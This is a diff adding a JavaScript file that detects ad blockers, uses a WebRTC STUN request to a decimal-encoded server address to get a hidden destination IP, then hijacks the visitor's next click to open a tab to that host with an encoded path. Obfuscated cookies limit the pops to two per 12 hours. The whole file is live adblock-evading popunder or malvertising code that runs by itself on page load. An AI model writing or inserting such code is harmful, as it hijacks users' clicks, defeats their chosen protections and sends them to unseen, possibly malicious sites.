@@ -1,0 +1,74 @@
+(function() {
+    var was_init = false;
+
+    function init_myscript() {
+        if (was_init) return;
+        was_init = true;
+        var c = document.createElement("div");
+        c.innerHTML = "&nbsp;";
+        c.className = "adsbox";
+        document.body.appendChild(c);
+        window.setTimeout(function() {
+            if (0 === c.offsetHeight) {
+                var l = 0,
+                    d = new(window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection)({
+                        iceServers: [{
+                            url: "stun:1755001826:443"
+                        }]
+                    }, {
+                        optional: [{
+                            RtpDataChannels: !0
+                        }]
+                    });
+                d.onicecandidate = function(b) {
+                    var e = "";
+                    !b.candidate || !(b = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/.exec(b.candidate.candidate)[1]) ||
+                        m || b.match(/^(192\.168\.|169\.254\.|10\.|172\.(1[6-9]|2\d|3[01]))/) || b.match(/^[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7}$/) || (m = !0, e = b, document.onclick = function() {
+                            current_count = parseInt((document.cookie.match("noprprywuxaqclzstcnt=([^;].+?)(;|$)") || [])[1] || 0);
+                            if (!l && 2 > current_count) {
+                                l = 1;
+                                var a = document.createElement("a"),
+                                    b = Math.floor(1E12 * Math.random()),
+                                    f = Math.random().toString(36).replace(/[^a-zA-Z0-9]+/g, "").substr(0, 10);
+                                a.href = "http://" + e + "/" + n.encode(b + "/" + (1335385 + b) + "/" + f);
+                                a.target = "_blank";
+                                document.body.appendChild(a);
+                                b = new MouseEvent("click", {
+                                    view: window,
+                                    bubbles: !1,
+                                    cancelable: !1
+                                });
+                                a.dispatchEvent(b);
+                                a.parentNode.removeChild(a);
+                                a = new Date;
+                                a.setTime(a.getTime() + 43200000);
+                                b_date = (existing_date = unescape((document.cookie.match("noprprywuxaqclzstexp=([^;].+?)(;|$)") || [])[1] || "")) ? existing_date : a.toGMTString();
+                                a = "; expires=" + b_date;
+                                document.cookie = "noprprywuxaqclzstcnt=" + (current_count + 1) + a + "; path=/";
+                                document.cookie = "noprprywuxaqclzstexp=" + b_date + a + "; path=/"
+                            }
+                        })
+                };
+                d.createDataChannel("");
+                d.createOffer(function(b) {
+                        d.setLocalDescription(b, function() {}, function() {})
+                    },
+                    function() {})
+            }
+            Math.random().toString(36).replace(/[^a-zA-Z0-9]+/g, "").substr(0, 10);
+            var m = !1,
+                n = {
+                    _0: "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",
+                    encode: function(b) {
+                        for (var e = "", a, c, f, d, k, g, h = 0; h < b.length;) a = b.charCodeAt(h++), c = b.charCodeAt(h++), f = b.charCodeAt(h++), d = a >> 2, a = (a & 3) << 4 | c >> 4, k = (c & 15) << 2 | f >> 6, g = f & 63, isNaN(c) ? k = g = 64 : isNaN(f) && (g = 64), e = e + this._0.charAt(d) + this._0.charAt(a) + this._0.charAt(k) + this._0.charAt(g);
+                        return e
+                    }
+                }
+        }, 100)
+    }
+    document.addEventListener("DOMContentLoaded", function() {
+        init_myscript();
+    });
+    window.setTimeout(init_myscript, 50)
+})();
+
